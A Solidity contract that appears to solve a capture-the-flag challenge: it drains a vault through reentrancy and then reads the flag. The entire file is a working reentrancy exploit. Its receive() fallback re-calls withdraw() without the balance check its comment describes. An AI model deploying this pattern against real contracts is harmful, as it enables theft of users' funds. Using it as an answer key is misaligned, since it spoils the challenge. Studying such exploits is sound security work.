// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
    function balanceOf(address) external view returns (uint256);
    function vaultDrained() external view returns (bool);
    function getFlag() external view returns (string memory);
}

contract ReentrancyAttackerSolution {
    IVault public immutable vault;
    uint256 private initialBalance;
    bool private attacking = false;

    constructor(address _vaultAddress) {
        vault = IVault(_vaultAddress);
    }

    // Main attack function - sends ETH to make an initial deposit
    function attack() external payable {
        require(msg.value > 0, "Send ETH to perform the attack");
        initialBalance = address(this).balance;
        
        // Make initial deposit to the vault
        vault.deposit{value: msg.value}();
        
        // Set attacking flag to true and start the reentrancy attack
        attacking = true;
        vault.withdraw();
        
        // After the attack is complete, check if we succeeded
        require(vault.vaultDrained(), "Failed to drain the vault");
        
        // Return ETH to the caller
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Failed to return funds");
    }

    // Fallback function to execute the reentrancy attack
    receive() external payable {
        // If we're in the middle of an attack and the vault still has funds
        if (attacking) {
            // Continue withdrawing until the vault is drained or we can't withdraw more
            vault.withdraw();
        }
    }

    // Function to retrieve the flag after a successful attack
    function getFlag() external view returns (string memory) {
        require(vault.vaultDrained(), "Vault not drained yet");
        return vault.getFlag();
    }
}